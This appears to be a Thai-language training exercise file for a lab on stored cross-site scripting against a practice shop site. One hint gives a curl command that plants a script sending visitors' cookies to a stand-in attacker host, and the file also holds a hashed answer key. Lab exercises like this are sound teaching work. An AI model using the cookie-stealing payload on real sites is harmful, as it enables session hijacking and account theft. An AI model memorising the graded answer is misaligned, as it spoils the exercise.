@@ -1,0 +1,70 @@
+{
+  "id": "c04-m08",
+  "chapter": "c04",
+  "title": "Stored XSS ผ่านช่อง Comment",
+  "difficulty": "hard",
+  "xp": 400,
+  "estMinutes": 20,
+  "lesson": "c04-l02",
+  "briefing": "หน้าสินค้าของ ShopZone ให้ลูกค้าเขียนรีวิวได้ ลองฝัง payload ไว้ในรีวิวแล้วดูว่ามันยังอยู่ทุกครั้งที่มีคนเปิดหน้านั้นหรือไม่",
+  "scope": {
+    "inScope": [
+      "shop.acme.test — 10.10.20.9"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.9"
+    ]
+  },
+  "machine": "training-box",
+  "startUser": "kali",
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "โพสต์ comment ที่มี <script> ลงในสินค้า id=2",
+      "type": "http",
+      "path": "^/comments$",
+      "method": "POST",
+      "body": "script"
+    },
+    {
+      "id": "o2",
+      "text": "เปิดหน้าสินค้านั้นอีกครั้งแล้วยืนยันว่า payload ยังอยู่แบบไม่ถูก encode",
+      "type": "http",
+      "path": "^/product$",
+      "query": "id=2",
+      "response": "<script>"
+    },
+    {
+      "id": "o3",
+      "text": "ถ้าปิดเบราว์เซอร์แล้วเปิดใหม่ในอีกวันหนึ่ง payload จะยังอยู่หรือไม่? (ตอบ yes หรือ no)",
+      "type": "answer",
+      "answerHash": "43e33aa5435d0d16550d2b5c3103045697669843814f43712c96a8bbdb443677"
+    }
+  ],
+  "hints": [
+    {
+      "cost": 10,
+      "text": "`curl -d 'product_id=2&author=me&body=<script>document.location=\"http://evil.test?c=\"+document.cookie</script>' http://shop.acme.test/comments`"
+    },
+    {
+      "cost": 20,
+      "text": "แล้ว `curl http://shop.acme.test/product?id=2` — comment จะยังอยู่เพราะถูกบันทึกไว้ในฐานข้อมูลแล้ว"
+    }
+  ],
+  "debrief": [
+    "ต่างจาก reflected XSS ตรงที่ payload ถูก **บันทึกไว้** ในฐานข้อมูล ไม่ใช่แค่สะท้อนกลับใน request เดียว — ทุกคนที่เปิดหน้าสินค้านี้ในอนาคตจะได้รับ payload นี้ไปด้วยโดยอัตโนมัติ ไม่ต้องหลอกให้ใครคลิกลิงก์เลย",
+    "ถ้าเหยื่อเป็นผู้ดูแลระบบที่เปิดดูรีวิวเพื่อตรวจสอบ (เช่น bot ตรวจสอบเนื้อหาอัตโนมัติ) payload ที่ขโมย cookie แบบนี้อาจทำให้ผู้โจมตีได้ session ของ admin ไปเลย"
+  ],
+  "references": [
+    "OWASP Top 10 A05:2025 Injection",
+    "CWE-79 Cross-site Scripting",
+    "OWASP WSTG-INPV-02 Testing for Stored XSS"
+  ],
+  "owasp": {
+    "2025": "A05",
+    "2021": "A03"
+  }
+}
